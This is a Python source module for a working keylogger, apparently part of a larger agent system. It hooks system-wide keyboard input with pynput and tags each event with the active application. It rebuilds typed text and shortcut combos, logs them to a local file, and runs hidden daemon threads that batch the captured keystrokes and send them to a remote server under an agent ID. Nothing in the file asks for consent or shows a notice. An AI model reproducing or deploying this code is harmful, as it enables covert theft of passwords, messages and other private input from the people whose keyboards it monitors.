import os
import json
import time
import threading
import datetime
import logging
from typing import Optional

from config.settings import (
    KEYLOG_FILE,
    KEYLOG_FLUSH_INTERVAL,
    KEYLOG_BATCH_SIZE,
    KEYLOG_SEND_INTERVAL
)
from core.current_app import get_current_app
from api.client import send_keylogs

try:
    from pynput import keyboard
except ImportError:
    keyboard = None

logger = logging.getLogger("keylogger")
logging.basicConfig(level=logging.INFO)

# =========================
# STATE
# =========================
BUFFER = []
LOG_BUFFER = []
SEND_BUFFER = []
PRESSED_KEYS = set()
LOCK = threading.Lock()
AGENT_ID = None

# =========================
# FILE SETUP
# =========================
def _ensure_file():
    """Ensure the keylog file and its directory exist."""
    os.makedirs(os.path.dirname(KEYLOG_FILE), exist_ok=True)


# =========================
# HELPERS
# =========================
def _now():
    """Get current UTC timestamp in ISO format."""
    return datetime.datetime.utcnow().isoformat() + "Z"


def _write_event(event_type, value):
    """Write a key event to the log buffer."""
    with LOCK:
        LOG_BUFFER.append({
            "ts": _now(),
            "app": get_current_app(),
            "type": event_type,
            "value": value
        })


def _flush_text_buffer():
    """Flush the text buffer as a single event."""
    global BUFFER

    if not BUFFER:
        return

    text = "".join(BUFFER)
    BUFFER.clear()

    _write_event("text", text)


# =========================
# KEY HANDLERS
# =========================
def _on_press(key):
    """Handle key press events."""
    global BUFFER

    try:
        PRESSED_KEYS.add(key)

        # combos (CMD + C, CTRL + V)
        if hasattr(key, "char") and key.char:
            if keyboard.Key.cmd in PRESSED_KEYS or keyboard.Key.ctrl in PRESSED_KEYS:
                combo = f"CMD+{key.char.upper()}"
                _flush_text_buffer()
                _write_event("combo", combo)
                return

        # normal keys
        try:
            char = key.char
            if char:
                BUFFER.append(char)
                return
        except AttributeError:
            pass

        # special keys (space, enter, backspace)
        _flush_text_buffer()

        if key == keyboard.Key.space:
            BUFFER.append(" ")
        elif key == keyboard.Key.enter:
            _write_event("key", "ENTER")
        elif key == keyboard.Key.backspace:
            if BUFFER:
                BUFFER.pop()
        else:
            _write_event("key", str(key))

    except Exception as e:
        logger.error(f"Keylogger error: {e}")


def _on_release(key):
    """Handle key release events."""
    try:
        PRESSED_KEYS.discard(key)
    except Exception:
        pass


# =========================
# DISK FLUSH
# =========================
def _flush_to_disk():
    """Flush the log buffer to disk."""
    global LOG_BUFFER, SEND_BUFFER

    if not LOG_BUFFER:
        return

    with LOCK:
        logs = LOG_BUFFER.copy()
        LOG_BUFFER.clear()

    # add to send buffer
    SEND_BUFFER.extend(logs)

    # save to disk
    with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
        for event in logs:
            f.write(json.dumps(event) + "\n")

# =========================
# DISK FLUSH LOOP (faster)
# =========================
def _send_to_disk_loop():
    """Background thread to flush logs to disk at intervals."""
    while True:
        time.sleep(KEYLOG_FLUSH_INTERVAL)

        try:
            _flush_text_buffer()
            _flush_to_disk()
        except Exception as e:
            logger.error(f"Disk flush error: {e}")

# =========================
# SERVER COMMUNICATION
# =========================
def _flush_to_server():
    """Send a batch of logs to the server."""
    global SEND_BUFFER

    if not AGENT_ID:
        return

    with LOCK:
        if not SEND_BUFFER:
            return

        logs_to_send = SEND_BUFFER[:KEYLOG_BATCH_SIZE]

    try:
        send_keylogs(AGENT_ID, logs_to_send)

        with LOCK:
            SEND_BUFFER = SEND_BUFFER[len(logs_to_send):]

        logger.info(f"Sent {len(logs_to_send)} logs to server")

    except Exception as e:
        logger.error(f"Send failed: {e}")


# =================================================
# SEND TO SERVER (slower, to avoid spamming)
# =================================================
def _send_to_server_loop():
    while True:
        time.sleep(KEYLOG_SEND_INTERVAL)

        try:
            _flush_to_server()
        except Exception as e:
            logger.error(f"Send loop error: {e}")

# =========================
# PUBLIC API
# =========================
def start_keylogger(agent_id: str | None) -> Optional["keyboard.Listener"]:
    global AGENT_ID

    if keyboard is None:
        logger.warning("pynput not installed, keylogger disabled")
        return None

    AGENT_ID = agent_id

    _ensure_file()

    listener = keyboard.Listener(
        on_press=_on_press,
        on_release=_on_release
    )

    listener.daemon = True
    listener.start()

    # disk flush thread (faster)
    disk_thread = threading.Thread(target=_send_to_disk_loop, daemon=True)
    disk_thread.start()

    # server send thread (slower, to avoid spamming)
    send_thread = threading.Thread(target=_send_to_server_loop, daemon=True)
    send_thread.start()

    logger.info(f"Keylogger started → {KEYLOG_FILE}")

    return listener
